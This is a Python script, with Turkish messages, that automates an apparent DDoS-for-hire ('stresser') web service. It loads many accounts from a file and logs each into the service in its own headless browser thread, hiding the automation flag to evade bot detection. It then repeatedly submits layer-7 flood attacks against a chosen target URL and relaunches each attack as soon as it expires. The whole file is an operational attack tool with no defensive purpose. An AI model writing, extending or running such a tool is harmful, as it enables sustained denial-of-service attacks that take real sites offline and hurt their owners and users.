import threading
import time
import os
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

ACCOUNTS_FILE = "accounts.txt"

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "browser-free"}]
    
    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            # KRİTİK: URL'deki ://'yi korumak için maxsplit=3 kullanıyoruz
            parts = line.split(":", 3)
            if len(parts) >= 3:
                user, pwd, url = parts[0], parts[1], parts[2]
                method = parts[3] if len(parts) >= 4 else "browser-free"
                accounts.append({
                    "id": str(idx),
                    "user": user,
                    "pass": pwd,
                    "url": url,
                    "method": method
                })
            else:
                print(f"⚠️ Geçersiz satır: {line}")
    return accounts

def attack_worker(account):
    acc_id = account["id"]
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)

    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")
    consecutive_errors = 0

    while True:
        try:
            with sync_playwright() as p:
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    args=["--no-sandbox", "--disable-dev-shm-usage"]
                )
                page = context.new_page()
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                """)

                print(f"[{username}] 🔐 Giriş yapılıyor...")
                try:
                    page.goto("https://l7srv.cc/login", timeout=120000, wait_until="domcontentloaded")
                    page.wait_for_load_state("networkidle", timeout=60000)
                    time.sleep(2)
                    page.fill("#username", username)
                    page.fill("#password", password)
                    page.click("button.btn-submit")
                    try:
                        page.wait_for_url(lambda url: "/dash" in url, timeout=30000)
                    except:
                        pass
                    print(f"[{username}] ✅ Giriş başarılı.")
                    consecutive_errors = 0
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    consecutive_errors += 1
                    time.sleep(10 if consecutive_errors < 3 else 60)
                    continue

                print(f"[{username}] 📡 Stress sayfası...")
                try:
                    page.goto("https://l7srv.cc/dash/stress", timeout=120000, wait_until="domcontentloaded")
                    page.wait_for_load_state("networkidle", timeout=60000)
                    time.sleep(3)
                    page.locator("#layer_7").wait_for(state="visible", timeout=15000)
                    page.locator("#layer_7").click()
                    consecutive_errors = 0
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress hatası: {stress_err}")
                    context.close()
                    consecutive_errors += 1
                    time.sleep(10 if consecutive_errors < 3 else 60)
                    continue

                while True:
                    try:
                        page.fill("#l7host", target_url, timeout=15000)
                        page.select_option("#l7method", value=method, timeout=10000)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value), timeout=10000)
                        page.click("#l7btn", timeout=10000)
                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
                        consecutive_errors = 0

                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı bitti.")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu.")
                                    break
                            time.sleep(2)

                        page.reload()
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(2)
                        page.locator("#layer_7").click()
                        time.sleep(1)

                    except Exception as inner_err:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                        consecutive_errors += 1
                        try:
                            page.reload()
                            time.sleep(5)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            print(f"[{username}] 💥 Kritik hata: {outer_err}")
            consecutive_errors += 1
            time.sleep(10)

if __name__ == "__main__":
    print("🚀 Başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")
    for acc in accounts:
        threading.Thread(target=attack_worker, args=(acc,), daemon=True).start()
        time.sleep(2)
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor.")
        sys.exit(0)
